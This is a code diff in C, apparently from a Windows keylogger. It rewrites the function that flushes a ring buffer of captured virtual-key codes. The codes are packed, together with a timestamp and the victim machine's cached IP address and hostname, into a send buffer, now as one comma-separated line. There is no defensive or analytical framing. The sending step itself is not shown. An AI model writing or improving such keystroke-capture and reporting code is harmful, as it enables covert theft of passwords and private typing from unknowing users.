@@ -232,33 +232,39 @@ static void FlushBuffer(void) {
 
     LeaveCriticalSection(&g_csRingBuffer);
 
-    // --- Step 2: Format messages ---
-    // Each formatted line: "YYYY-MM-DD HH:MM:SS|ip|hostname|VK=0xXX\n"
-    // Max ~80 bytes per line. Allocate generously.
-    int sendBufSize = entryCount * 80 + 1;
+    // --- Step 2: Format message ---
+    // Format: "YYYY-MM-DD HH:MM:SS|ip|hostname|0xXX,0xYY,0xZZ\n"
+    // Metadata prefix ~55 bytes + ~5 bytes per entry (0xXX,)
+    int sendBufSize = 64 + entryCount * 6 + 2;
     char* sendBuf = (char*)malloc(sendBufSize);
     if (sendBuf == NULL) {
         free(localEntries);
         return;
     }
 
-    int offset = 0;
+    // Write metadata prefix using first entry's timestamp
     char timestamp[20];
+    FormatTimestamp(&localEntries[0].captureTime, timestamp, sizeof(timestamp));
+    int offset = sprintf_s(sendBuf, sendBufSize, "%s|%s|%s|",
+                           timestamp, g_cachedIP, g_cachedHostname);
 
+    // Append comma-separated hex VK codes
     for (int i = 0; i < entryCount; i++) {
-        FormatTimestamp(&localEntries[i].captureTime, timestamp, sizeof(timestamp));
         int written = sprintf_s(
             sendBuf + offset,
             sendBufSize - offset,
-            "%s|%s|%s|VK=0x%02X\n",
-            timestamp,
-            g_cachedIP,
-            g_cachedHostname,
+            (i < entryCount - 1) ? "0x%02X," : "0x%02X",
             localEntries[i].vkCode
         );
         if (written > 0) {
             offset += written;
         }
+    }
+
+    // Append newline
+    if (offset < sendBufSize - 1) {
+        sendBuf[offset++] = '\n';
+        sendBuf[offset] = '\0';
     }
 
     free(localEntries);
